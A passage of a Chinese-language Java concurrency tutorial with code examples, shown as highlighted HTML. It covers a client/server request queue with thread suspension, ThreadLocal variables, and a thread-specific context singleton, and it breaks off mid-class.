<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 客户端: 发送任务
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClientThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">RequestQueue</span> queue<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">Random</span> random<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> sendValue<span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token class-name">ClientThread</span><span class="token punctuation">(</span><span class="token class-name">RequestQueue</span> queue<span class="token punctuation">,</span> <span class="token class-name">String</span> sendValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>queue <span class="token operator">=</span> queue<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>sendValue <span class="token operator">=</span> sendValue<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Client -&gt; request "</span> <span class="token operator">+</span> sendValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
            queue<span class="token punctuation">.</span><span class="token function">putRequest</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span>sendValue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Client -&gt; Wake up from sleeping"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 服务端：处理任务
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServerThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">RequestQueue</span> queue<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Random</span> random<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> closed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token class-name">ServerThread</span><span class="token punctuation">(</span><span class="token class-name">RequestQueue</span> queue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>queue <span class="token operator">=</span> queue<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>closed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Request</span> request <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">==</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// queue从wait中被打断</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Received the empty request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server -&gt;"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server -&gt; Wake up from sleeping"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 关闭服务端线程
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>closed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 测试类
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SuspensionClient</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>

        <span class="token keyword">final</span> <span class="token class-name">RequestQueue</span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ClientThread</span> clientThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClientThread</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        clientThread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ServerThread</span> serverThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerThread</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        serverThread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server ready to close."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        serverThread<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter10：ThreadLocal：线程局部变量</h1>
<ul>
<li>
<p>This class provides thread-local variables. These variables differ from their  normal counterparts in that each thread that accesses one (via its  <code>get</code> or <code>set</code> method) has its own, independently  initialized copy of the variable.</p>
</li>
<li>
<p><code>ThreadLocal</code> instances are  typically private static fields in classes that wish to associate state with a  thread (e.g., a user ID or Transaction ID).</p>
</li>
<li>
<p>每个访问<code>ThreadLocal</code>变量的线程，都会获取到一个<code>ThreadLocal</code>变量的<strong>副本</strong>，线程之间互不影响。</p>
</li>
<li>
<p><code>始终以当前线程作为KEY值</code></p>
</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadLocalSimpleTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> threadLocal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">protected</span> <span class="token class-name">String</span> <span class="token function">initialValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"设置默认值"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token comment">// 主线程获取ThreadLocal</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        threadLocal<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"TEST"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1_000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            threadLocal<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"TEST-1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            threadLocal<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"TEST-2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1_000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 主线程再次获取ThreadLocal</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> threadLocal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">main<span class="token operator">--</span><span class="token number">1836019240</span><span class="token operator">--</span><span class="token operator">-</span>设置默认值
main<span class="token operator">--</span><span class="token number">1836019240</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">TEST</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span><span class="token operator">--</span><span class="token number">1836019240</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">TEST</span><span class="token operator">-</span><span class="token number">1</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">--</span><span class="token number">1836019240</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">TEST</span><span class="token operator">-</span><span class="token number">2</span>
main<span class="token operator">--</span><span class="token number">1836019240</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">TEST</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter11：The Thread-Specific Storage：线程保险箱</h1>
<blockquote>
<p>Java高并发编程详解：第二十一章</p>
</blockquote>
<p>线程上下文：线程级别的单例，利用ThreadLocal实现。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 上下文内容
 */</span>
<span class="token annotation punctuation">@Getter</span>
<span class="token annotation punctuation">@Setter</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Context</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> cardId<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 线程上下文工具类：线程级别的单例
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ActionContext</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">ActionContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Context</span><span class="token punctuation">&gt;</span></span> threadLocal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Context</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">protected</span> <span class="token class-name">Context</span> <span class="token function">initialValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Context</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ContextHolder</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">ActionContext</span> actionContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActionContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ActionContext</span> <span class="token function">getActionContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token class-name">ActionContext<span class="token punctuation">.</span>ContextHolder</span><span class="token punctuation">.</span>actionContext<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> threadLocal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 线程工作内容
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExecutionTask</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token class-name">QueryFromDBAction</span> queryFromDBAction <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryFromDBAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">QueryFromHttpAction</span> queryFromHttpAction <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryFromHttpAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 分步骤获取</span>
        queryFromDBAction<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" The name query successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        queryFromHttpAction<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" The card id query successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 最后，统一获取</span>
        <span class="token class-name">Context</span> context <span class="token operator">=</span> <span class="token class-name">ActionContext</span><span class="token punctuation">.</span><span class="token function">getActionContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The Name is "</span> <span class="token operator">+</span> context<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" and CardId "</span> <span class="token operator">+</span> context<span class="token punctuation">.</span><span class="token function">getCardId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 线程工作内容：从DB获取
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QueryFromDBAction</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"Alex "</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ActionContext</span><span class="token punctuation">.</span><span class="token function">getActionContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 线程工作内容：从网络获取
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QueryFromHttpAction</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
